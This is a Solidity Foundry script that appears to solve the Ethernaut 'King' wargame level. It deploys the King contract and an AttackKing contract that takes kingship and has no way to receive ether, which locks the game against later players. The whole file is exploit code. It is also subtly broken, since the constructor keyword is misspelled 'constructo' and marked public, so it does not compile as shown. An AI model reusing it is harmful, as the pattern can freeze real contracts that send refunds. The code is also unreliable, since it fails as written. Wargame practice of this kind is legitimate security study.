pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King} from "../../src/Ethernaut/King.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        King king = new King();
        AttackKing attackKing = new AttackKing{value: (0.001 ether)}(payable(address(king)));
        vm.stopBroadcast();
    }
}

contract AttackKing {
    constructo(address payable to) public payable {
        (bool success,) = address(to).call{value: msg.value}("");
        require(success, "err");
    }
}
